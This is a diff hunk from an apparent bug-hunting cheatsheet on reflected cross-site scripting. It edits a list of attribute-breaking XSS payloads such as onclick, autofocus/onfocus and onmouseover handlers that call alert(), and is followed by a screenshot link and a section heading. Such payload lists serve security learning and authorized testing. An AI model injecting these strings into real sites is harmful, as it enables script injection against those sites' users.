@@ -53,7 +53,7 @@ If this is the case, you should inject this payloads.
 " onclick="alert(1337)
 " autofocus="alert(1337)
 " autofocus onfocus="alert(1337)
-"onmouseover="alert(1)
+" onmouseover="alert(1)
 ```
 ![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
 # Reflected XSS into a JavaScript string with angle brackets HTML encoded
